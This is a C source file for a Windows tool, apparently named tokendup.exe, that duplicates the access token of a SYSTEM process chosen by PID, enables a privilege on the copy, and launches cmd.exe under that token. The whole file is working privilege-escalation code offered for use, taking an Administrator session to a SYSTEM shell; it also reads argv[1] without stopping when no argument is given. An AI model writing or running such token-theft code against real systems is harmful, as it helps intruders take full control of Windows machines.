#include <Windows.h>
#include <stdio.h>

HANDLE hTargetProcess = NULL;
HANDLE hToken = NULL;
HANDLE hNewToken = NULL;
SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, FALSE };
STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi;
TOKEN_PRIVILEGES tp = { sizeof(tp) };

void DupTokenShell(int pid)
{
	hTargetProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (!hTargetProcess)
	{
		printf("[x] Error opening the target process.");
		CloseHandle(hTargetProcess);
		exit(1);
	}

	BOOL Ret = OpenProcessToken(hTargetProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken);
	if (!Ret)
	{
		printf("[x] Error opening target token: %lu\n", GetLastError());
		CloseHandle(hTargetProcess);
		exit(1);
	}

	BOOL DupRes = DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityAnonymous, TokenPrimary, &hNewToken);
	if (!DupRes)
	{
		printf("[x] Error duplicating token. Error: %lu\n", GetLastError());
		CloseHandle(hToken);
		CloseHandle(hTargetProcess);
		exit(1);
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid.LowPart = 0x03;
	tp.Privileges[0].Luid.HighPart = 0;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	printf("[+] Adjusting privilege...\n");

	BOOL AdjusRes = AdjustTokenPrivileges(hNewToken, FALSE, &tp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	if (!AdjusRes)
	{
		printf("[x] Error adjusting privilege.");
		CloseHandle(hToken);
		CloseHandle(hNewToken);
		CloseHandle(hTargetProcess);
		exit(1);
	}
	if (GetLastError() == 0)
	{
		printf("[+] No errors found adjusting privilege.\n");
	}
	else
	{
		printf("[x] Error adjusting privilege: %lu\n", GetLastError());
		CloseHandle(hToken);
		CloseHandle(hTargetProcess);
		exit(1);
	}

  	BOOL ImpRes = ImpersonateLoggedOnUser(hNewToken);

	if (!CreateProcessAsUser(hNewToken, L"C:\\windows\\system32\\cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
	{
		printf("[x] Error creating SYSTEM shell: %lu\n", GetLastError());
		CloseHandle(hToken);
		CloseHandle(hNewToken);
		CloseHandle(hTargetProcess);
		exit(1);
	}
	printf("[+] New shell created. You have SYSTEM privilege.\n");
}


void main(int argc, char* argv[])
{
	if (argc < 2)
	{
		printf("\nElevates privilege from Administrator to SYSTEM. Run with Administrator privilege\n");
		printf("[+] Usage: tokendup.exe <pid of process with SYSTEM privilege>\n");
	}
	
	int pid = atoi(argv[1]);
	DupTokenShell(pid);
}

